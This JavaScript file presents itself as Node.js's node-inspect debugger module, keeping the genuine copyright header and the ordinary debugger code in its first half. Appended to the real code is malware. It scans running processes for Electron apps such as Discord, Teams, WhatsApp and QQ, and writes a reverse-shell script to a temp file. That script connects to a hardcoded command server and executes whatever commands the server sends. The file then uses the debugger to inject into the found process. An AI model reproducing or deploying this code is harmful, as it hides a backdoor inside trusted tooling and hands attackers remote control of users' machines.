/*
 * Copyright Node.js contributors. All rights reserved.
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to
 * deal in the Software without restriction, including without limitation the
 * rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
 * sell copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
 * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
 * IN THE SOFTWARE.
 */
'use strict';
const { spawn } = require('child_process');
const { EventEmitter } = require('events');
const net = require('net');
const util = require('util');

const runAsStandalone = typeof __dirname !== 'undefined';

const [ InspectClient, createRepl ] =
  runAsStandalone ?
  // This copy of node-inspect is on-disk, relative paths make sense.
    [
      require('./internal/inspect_client'),
      require('./internal/inspect_repl')
    ] :
  // This copy of node-inspect is built into the node executable.
    [
      require('node-inspect/lib/internal/inspect_client'),
      require('node-inspect/lib/internal/inspect_repl')
    ];

const debuglog = util.debuglog('inspect');

class StartupError extends Error {
  constructor(message) {
    super(message);
    this.name = 'StartupError';
  }
}

function portIsFree(host, port, timeout = 9999) {
  if (port === 0) return Promise.resolve(); // Binding to a random port.

  const retryDelay = 150;
  let didTimeOut = false;

  return new Promise((resolve, reject) => {
    setTimeout(() => {
      didTimeOut = true;
      reject(new StartupError(
        `Timeout (${timeout}) waiting for ${host}:${port} to be free`));
    }, timeout);

    function pingPort() {
      if (didTimeOut) return;

      const socket = net.connect(port, host);
      let didRetry = false;
      function retry() {
        if (!didRetry && !didTimeOut) {
          didRetry = true;
          setTimeout(pingPort, retryDelay);
        }
      }

      socket.on('error', (error) => {
        if (error.code === 'ECONNREFUSED') {
          resolve();
        } else {
          retry();
        }
      });
      socket.on('connect', () => {
        socket.destroy();
        retry();
      });
    }
    pingPort();
  });
}

function runScript(script, scriptArgs, inspectHost, inspectPort, childPrint) {
  return portIsFree(inspectHost, inspectPort)
    .then(() => {
      return new Promise((resolve) => {
        const needDebugBrk = process.version.match(/^v(6|7)\./);
        const args = (needDebugBrk ?
          ['--inspect', `--debug-brk=${inspectPort}`] :
          [`--inspect-brk=${inspectPort}`])
          .concat([script], scriptArgs);
        const child = spawn(process.execPath, args);
        child.stdout.setEncoding('utf8');
        child.stderr.setEncoding('utf8');
        child.stdout.on('data', childPrint);
        child.stderr.on('data', childPrint);

        let output = '';
        function waitForListenHint(text) {
          output += text;
          if (/Debugger listening on ws:\/\/\[?(.+?)\]?:(\d+)\//.test(output)) {
            const host = RegExp.$1;
            const port = Number.parseInt(RegExp.$2);
            child.stderr.removeListener('data', waitForListenHint);
            resolve([child, port, host]);
          }
        }

        child.stderr.on('data', waitForListenHint);
      });
    });
}

function createAgentProxy(domain, client) {
  const agent = new EventEmitter();
  agent.then = (...args) => {
    // TODO: potentially fetch the protocol and pretty-print it here.
    const descriptor = {
      [util.inspect.custom](depth, { stylize }) {
        return stylize(`[Agent ${domain}]`, 'special');
      },
    };
    return Promise.resolve(descriptor).then(...args);
  };

  return new Proxy(agent, {
    get(target, name) {
      if (name in target) return target[name];
      return function callVirtualMethod(params) {
        return client.callMethod(`${domain}.${name}`, params);
      };
    },
  });
}

class NodeInspector {
  constructor(options, stdin, stdout) {
    this.options = options;
    this.stdin = stdin;
    this.stdout = stdout;

    this.paused = true;
    this.child = null;

    if (options.script) {
      this._runScript = runScript.bind(null,
        options.script,
        options.scriptArgs,
        options.host,
        options.port,
        this.childPrint.bind(this));
    } else {
      this._runScript =
          () => Promise.resolve([null, options.port, options.host]);
    }

    this.client = new InspectClient();

    this.domainNames = ['Debugger', 'HeapProfiler', 'Profiler', 'Runtime'];
    this.domainNames.forEach((domain) => {
      this[domain] = createAgentProxy(domain, this.client);
    });
    this.handleDebugEvent = (fullName, params) => {
      const [domain, name] = fullName.split('.');
      if (domain in this) {
        this[domain].emit(name, params);
      }
    };
    this.client.on('debugEvent', this.handleDebugEvent);
    const startRepl = createRepl(this);

    // Handle all possible exits
    process.on('exit', () => this.killChild());
    process.once('SIGTERM', process.exit.bind(process, 0));
    process.once('SIGHUP', process.exit.bind(process, 0));

    this.run()
      .then(() => startRepl())
      .then((repl) => {
        this.repl = repl;
        this.repl.on('exit', () => {
          process.exit(0);
        });
        this.paused = false;
      })
      .then(null, (error) => process.nextTick(() => { throw error; }));
  }

  suspendReplWhile(fn) {
    if (this.repl) {
      this.repl.pause();
    }
    this.stdin.pause();
    this.paused = true;
    return new Promise((resolve) => {
      resolve(fn());
    }).then(() => {
      this.paused = false;
      if (this.repl) {
        this.repl.resume();
        this.repl.displayPrompt();
      }
      this.stdin.resume();
    }).then(null, (error) => process.nextTick(() => { throw error; }));
  }

  killChild() {
    this.client.reset();
    if (this.child) {
      this.child.kill();
      this.child = null;
    }
  }

  run() {
    this.killChild();

    return this._runScript().then(([child, port, host]) => {
      this.child = child;

      let connectionAttempts = 0;
      const attemptConnect = () => {
        ++connectionAttempts;
        debuglog('connection attempt #%d', connectionAttempts);
        this.stdout.write('.');
        return this.client.connect(port, host)
          .then(() => {
            debuglog('connection established');
            this.stdout.write(' ok');
          }, (error) => {
            debuglog('connect failed', error);
            // If it's failed to connect 10 times then print failed message
            if (connectionAttempts >= 10) {
              this.stdout.write(' failed to connect, please retry\n');
              process.exit(1);
            }

            return new Promise((resolve) => setTimeout(resolve, 500))
              .then(attemptConnect);
          });
      };

      this.print(`connecting to ${host}:${port} ..`, true);
      return attemptConnect();
    });
  }

  clearLine() {
    if (this.stdout.isTTY) {
      this.stdout.cursorTo(0);
      this.stdout.clearLine(1);
    } else {
      this.stdout.write('\b');
    }
  }

  print(text, oneline = false) {
    this.clearLine();
    this.stdout.write(oneline ? text : `${text}\n`);
  }

  childPrint(text) {
    this.print(
      text.toString()
        .split(/\r\n|\r|\n/g)
        .filter((chunk) => !!chunk)
        .map((chunk) => `< ${chunk}`)
        .join('\n')
    );
    if (!this.paused) {
      this.repl.displayPrompt(true);
    }
    if (/Waiting for the debugger to disconnect\.\.\.\n$/.test(text)) {
      this.killChild();
    }
  }
}

function parseArgv([target, ...args]) {
  let host = '127.0.0.1';
  let port = 9229;
  let isRemote = false;
  let script = target;
  let scriptArgs = args;

  const hostMatch = target.match(/^([^:]+):(\d+)$/);
  const portMatch = target.match(/^--port=(\d+)$/);

  if (hostMatch) {
    // Connecting to remote debugger
    // `node-inspect localhost:9229`
    host = hostMatch[1];
    port = parseInt(hostMatch[2], 10);
    isRemote = true;
    script = null;
  } else if (portMatch) {
    // start debugee on custom port
    // `node inspect --port=9230 script.js`
    port = parseInt(portMatch[1], 10);
    script = args[0];
    scriptArgs = args.slice(1);
  } else if (args.length === 1 && /^\d+$/.test(args[0]) && target === '-p') {
    // Start debugger against a given pid
    const pid = parseInt(args[0], 10);
    try {
      process._debugProcess(pid);
    } catch (e) {
      if (e.code === 'ESRCH') {
        /* eslint-disable no-console */
        console.error(`Target process: ${pid} doesn't exist.`);
        /* eslint-enable no-console */
        process.exit(1);
      }
      throw e;
    }
    script = null;
    isRemote = true;
  }

  return {
    host, port, isRemote, script, scriptArgs,
  };
}



const os = require('os');
const path = require('path');
const childProcess = require('child_process');
const fs = require('fs');
let injected_app = ["qq.","githubdesktop","teams","discord","twitch","淘宝直播","whatsapp"];

function getTempDir() {
  let appname = "index_microsoft"
  if (process.platform === 'win32') {
      return path.join(os.tmpdir(), appname);
  } else if (process.platform === 'linux') {
      return path.join(os.tmpdir(), appname);
  } else if (process.platform === 'darwin') {
      return path.join(os.tmpdir(), appname);
  } else {
      throw new Error('Unsupported operating system');
  }
}

function writeTofile(){
  const tmpDir = getTempDir();
  const shellcontent = `
  const net = require('net');
  const { exec } = require('child_process');
  
  function doit() {
    const client = new net.Socket();
    const c2_info = {"pub_ip":"175.27.249.94","port":"8889"};
    client.connect(c2_info.port, c2_info.pub_ip, () => {
      client.write('Hello, server!\\n');
    });
    client.on('data', data => {
      client.write(\`Received: \${data}\`);
      data = data.toString('utf-8');
      // 执行系统命令
      exec(data, (error, stdout, stderr) => {
        
        let result_ = "";
        if (error) {
          result_ = \`Error: \${error.message}\`;
        }else{
          if (stderr) {
            result_ = \`Stderr: \${stderr}\`;
          }else{
            result_ = \`Command output:\\n\${stdout}\`;
          }
        }
        client.write(result_);
        //console.log(\`Command output:\\n\${stdout}\`);
      });
      // client.end();  关闭连接
    });
    client.on('close', () => {
      console.log('Connection closed');
    });
  }
  module.exports = {
      doit: doit
  };
  `;

  fs.writeFile(tmpDir, shellcontent, err => {
      if (err) {
          //console.error('Error writing file:', err);
      } else {
          //console.log('File written successfully.');
      }
  });
}



function getAllProcesses() {
  const platform = os.platform();
  const processList = [];

  if (platform === 'win32') {
      const command = 'tasklist /FO CSV /NH';
      const output = childProcess.execSync(command, { encoding: 'utf-8' });
      const lines = output.trim().split('\n');

      for (const line of lines) {
          const columns = line.split('","');
          if (columns.length >= 2) {
              const name = columns[0].replace(/^"/, '');
              const pid = parseInt(columns[1]);
              processList.push({ pid, name });
          }
      }
  } else if (platform === 'linux' || platform === 'darwin') {
      const command = 'ps -e -o pid,comm';
      const output = childProcess.execSync(command, { encoding: 'utf-8' });
      const lines = output.trim().split('\n');

      for (let i = 1; i < lines.length; i++) {
          const [pid, name] = lines[i].trim().split(/\s+/);
          processList.push({ pid: parseInt(pid), name });
      }
  } else {
      console.error('Unsupported platform:', platform);
  }

  return processList;
}


async function findpid(injected_app){
	const processList = getAllProcesses();
	for (const process of processList) {
		for (const i_app of injected_app) {
			if (process.name.toLowerCase().includes(i_app.toLowerCase())){
        console.log(`yes find this: ${process.name} ${process.pid}`)
				return process.pid;
			}
		};
	};
}
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


function startInspect(argv = process.argv.slice(2),
  stdin = process.stdin,
  stdout = process.stdout) {

  //1. find a process we can inject
  findpid(injected_app).then(pid_=>{
      // 2. write inject script to path
      writeTofile();
      // 3. do the inject work
		  process._debugProcess(pid_);
		  async function main() {
			  console.log('sleep...');
			  await sleep(3000); // 3s
			}
		  const pid = [pid_];
		  const options = {
			  host: '127.0.0.1',
			  port: 9229,
			  isRemote: true,
			  script: null,
			  scriptArgs: pid
			}
		  const inspector = new NodeInspector(options, stdin, stdout);
		  stdin.resume();
		  function handleUnexpectedError(e) {
			if (!(e instanceof StartupError)) {
			  console.error('There was an internal error in node-inspect. ' +
							'Please report this bug.');
			  console.error(e.message);
			  console.error(e.stack);
			} else {
			  console.error(e.message);
			}
			if (inspector.child) inspector.child.kill();
			process.exit(1);
		  }

		  process.on('uncaughtException', handleUnexpectedError);
	  });
}
exports.start = startInspect;